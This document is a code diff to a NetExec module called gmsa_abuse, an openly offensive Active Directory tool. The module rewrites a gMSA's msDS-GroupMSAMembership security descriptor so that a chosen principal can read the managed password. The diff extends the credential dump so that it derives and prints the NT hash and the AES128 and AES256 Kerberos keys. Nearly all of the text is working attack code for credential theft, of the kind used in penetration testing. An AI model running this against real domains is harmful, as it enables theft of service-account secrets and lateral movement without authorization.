@@ -1,6 +1,7 @@
 from binascii import hexlify
 
-from Cryptodome.Hash import MD4
+from impacket.krb5 import constants
+from impacket.krb5.crypto import generate_kerberos_keys
 from impacket.ldap import ldaptypes
 from impacket.ldap.ldap import LDAPSessionError, MODIFY_DELETE, MODIFY_REPLACE
 from impacket.uuid import bin_to_string
@@ -37,8 +38,8 @@ class NXCModule:
                  hold GenericAll/GenericWrite/WriteDACL/WriteOwner/WriteProperties.
                  With PRINCIPAL=<account> only results for that account are shown.
       exploit -- grant PRINCIPAL read access to TARGET's gMSA password by patching
-                 msDS-GroupMSAMembership, then dump the NT hash.  The original SD is
-                 restored automatically unless RESTORE=false is set.
+                 msDS-GroupMSAMembership, then dump the NT hash and Kerberos keys.
+                 The original SD is restored automatically unless RESTORE=false is set.
 
     Examples:
       netexec ldap <DC> -u <user> -p <pass> -M gmsa_abuse
@@ -244,19 +245,18 @@ class NXCModule:
         )
         parsed2 = parse_result_attributes(resp2)
 
-        nt_hash = None
         if parsed2 and "msDS-ManagedPassword" in parsed2[0]:
             try:
-                blob = MSDS_MANAGEDPASSWORD_BLOB()
-                blob.fromString(parsed2[0]["msDS-ManagedPassword"])
-                current_pw = blob["CurrentPassword"][:-2]
-                md4 = MD4.new()
-                md4.update(current_pw)
-                nt_hash = hexlify(md4.digest()).decode()
-                self.context.log.highlight(
-                    f"{self.target_gmsa}:::aad3b435b51404eeaad3b435b51404ee:{nt_hash}:::"
+                rc4, aes128, aes256 = self._compute_gmsa_secrets(
+                    parsed2[0]["msDS-ManagedPassword"],
+                    parsed2[0]["sAMAccountName"],
                 )
-                self.context.log.success(f"NT hash: {nt_hash}")
+                self.context.log.highlight(
+                    f"{self.target_gmsa}:::aad3b435b51404eeaad3b435b51404ee:{rc4}:::"
+                )
+                self.context.log.success(f"NT hash: {rc4}")
+                self.context.log.highlight(f"aes128-cts-hmac-sha1-96: {aes128}")
+                self.context.log.highlight(f"aes256-cts-hmac-sha1-96: {aes256}")
             except Exception as e:
                 self.context.log.fail(f"Failed to parse msDS-ManagedPassword blob: {e}")
         else:
@@ -293,6 +293,18 @@ class NXCModule:
     # ------------------------------------------------------------------
     # Helpers
     # ------------------------------------------------------------------
+
+    def _compute_gmsa_secrets(self, password_data: bytes, sam_account_name: str) -> tuple:
+        """Compute RC4 (NT hash), AES128, and AES256 keys from a gMSA managed password blob."""
+        blob = MSDS_MANAGEDPASSWORD_BLOB()
+        blob.fromString(password_data)
+        hex_pass = hexlify(blob["CurrentPassword"].rstrip(b"\x00")).decode()
+
+        keys = generate_kerberos_keys(hex_pass=hex_pass, user=sam_account_name, domain=self.connection.domain)
+        rc4 = hexlify(keys[constants.EncryptionTypes.rc4_hmac.value].contents).decode()
+        aes128 = hexlify(keys[constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value].contents).decode()
+        aes256 = hexlify(keys[constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value].contents).decode()
+        return rc4, aes128, aes256
 
     def _build_membership_sd(self, sid_str: str) -> bytes:
         """Build a minimal security descriptor with one ACE granting FullControl to sid_str."""
